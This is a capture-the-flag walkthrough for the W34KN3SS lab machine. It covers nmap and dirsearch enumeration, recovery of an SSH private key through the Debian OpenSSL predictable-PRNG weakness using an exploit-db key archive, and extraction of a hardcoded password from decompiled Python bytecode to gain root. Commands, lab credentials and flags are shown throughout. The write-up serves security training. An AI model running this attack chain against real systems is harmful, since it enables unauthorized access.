Rated Medium but was more for beginners.

---------------------------------------------------------------------
NMAP
---------------------------------------------------------------------

root@kali ~# nmap -sS -sV -V -T4 -p- 10.0.0.29

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)
|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)
|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo
| Not valid before: 2018-05-05T11:12:54
|_Not valid after:  2019-05-05T11:12:54
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time

Starting with a NMAP scan we can see the information about ssl-cert on HTTPS commonName=weakness.jth/organizationName=weakness.jth

This means that the domain name of the webserver is weakness.jth, NICE! before we even started enumerating we found the domain name.
Adding it to the /etc/hosts file we can start enumarting.

---------------------------------------------------------------------
HTTP/HTTPS
---------------------------------------------------------------------

root@kali ~/D/C/W34KN3SS# dirsearch -u https://10.0.0.29

[19:08:58] 200 -  735B  - /blog/                                            
[19:08:59] 200 -    1KB - /code                                             
[19:09:04] 200 -   11KB - /index.html                                       
[19:09:13] 403 -  299B  - /server-status/                                   
[19:09:13] 403 -  298B  - /server-status                                    
[19:09:15] 301 -  307B  - /test  ->  https://10.0.0.29/test/                
[19:09:15] 200 -   72B  - /test/                                                                           
[19:09:16] 200 -  216B  - /upload.php                                                                      
[19:09:16] 301 -  310B  - /uploads  ->  https://10.0.0.29/uploads/                                         
[19:09:16] 200 -  741B  - /uploads/   

We find a couple of intersting directories.
Going /test we get a picture of neo and it stats: it's all about keys :D. We are gonna log in with a key instead of a password via ssh.
The website running on HTTPS doesn't have any intersting information, only some rabbit holes.

Going to http://weakness.jth the site displays "keep following the white rabbit :D" with an ascii banner of a rabbit, signed by "n30" perhaps a username.

root@kali ~/D/C/W34KN3SS# dirsearch -u http://weakness.jth

[19:08:25] 200 -  526B  - /index.html                                       
[19:08:32] 301 -  314B  - /private  ->  http://weakness.jth/private/        
[19:08:33] 200 -   14B  - /robots.txt

Going to robots.txt we get another rabbit hole.

robots.txt:
Forget it !! 

Let's try going to the private directory. There are 2 files,
notes.txt:
this key was generated by openssl 0.9.8c-1

And a ssh public key, we have the public key but in order to login we need the private key, time to find some CVEs.
I tried searching for openssl 0.9.8c-1 on metasploit but found no exploit, I searched "linux commands to find exploits" and found the "searchsploit" command.

root@kali ~/D/C/W34KN3SS# searchsploit openssl 0.9.8c-1
-------------------------------------------------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- 
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG  | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG  | linux/remote/5632.rb
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG  | linux/remote/5720.py
-------------------------------------------------------------------------

root@kali ~/D/C/W34KN3SS# searchsploit -m linux/remote/5622.txt

"After downloading the instructions it stats:
the debian openssl issue leads that there are only 65.536 possible ssh
keys generated, cause the only entropy is the pid of the process
generating the key.

This leads to that the following perl script can be used with the
precalculated ssh keys to brute force the ssh login. It works if such a
keys is installed on a non-patched debian or any other system manual
configured to."

We can download the archived from https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2

After unarchiving it, it held the directory rsa/2048, this direcotry has all the possible ssh keys, we can search for out public key and find it's private key.

root@kali ~/D/C/W/r/2048# cat ../../mykey.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster

root@kali ~/D/C/W/r/2048# ls -l | grep -lr "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw=="
      
result:     
4161de56829de2fe64b9055711f531c1-2537.pub

The file "4161de56829de2fe64b9055711f531c1-2537" holds our private key, let's log in with ssh. We now need a username, the only possible username I found was "n30".

root@kali ~/D/C/W/r/2048# ssh n30@10.0.0.29 -i 4161de56829de2fe64b9055711f531c1-2537

And it works!!!

We have our first flag.

user.txt:
25e3cd678875b601425c9356c8039f68

Let's see if we any root privileges.

n30@W34KN3SS:~$ sudo -l
[sudo] password for n30:

Oh, we don't have the password for the user but there is an executable in the home directory named code.

n30@W34KN3SS:~$ file code
code: python 2.7 byte-compiled

We have a complied python script.

n30@W34KN3SS:~$ python2 code
[+]System Started at : Mon Jan 24 01:20:19 2022
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : f9484863bd3edcb6d654bedbe32e4eb70ebc68d86e8ea7fba0a713fa6188861a
[+]Done

It's output is a couple of unintresting stuff and a hash, this might mean there the script holds a password.
After downloading I found an online python decomplier. Source code:

{
# uncompyle6 version 3.5.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.8 (default, Nov 16 2020, 16:55:22) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
# Embedded file name: code.py
# Compiled at: 2018-05-08 23:50:54
import os, socket, time, hashlib
print ('[+]System Started at : {0}').format(time.ctime())
print '[+]This binary should generate unique hash for the hardcoded login info'
print '[+]Generating the hash ..'
inf = ''
inf += chr(ord('n'))
inf += chr(ord('3'))
inf += chr(ord('0'))
inf += chr(ord(':'))
inf += chr(ord('d'))
inf += chr(ord('M'))
inf += chr(ord('A'))
inf += chr(ord('S'))
inf += chr(ord('D'))
inf += chr(ord('N'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('3'))
inf += chr(ord('3'))
hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
print ('[+]Your new hash is : {0}').format(hashf)
print '[+]Done'
}

After reordering the characters we have a password for the n30 user!!

n30:dMASDNB!!#B!#!#33

Now we can see our root privileges.

n30@W34KN3SS:~$ sudo -l
[sudo] password for n30: 
User n30 may run the following commands on W34KN3SS:
    (ALL : ALL) ALL

Wow. Just Wow. We can read our final flag.

root.txt:
a1d2fab76ec6af9b651d4053171e042e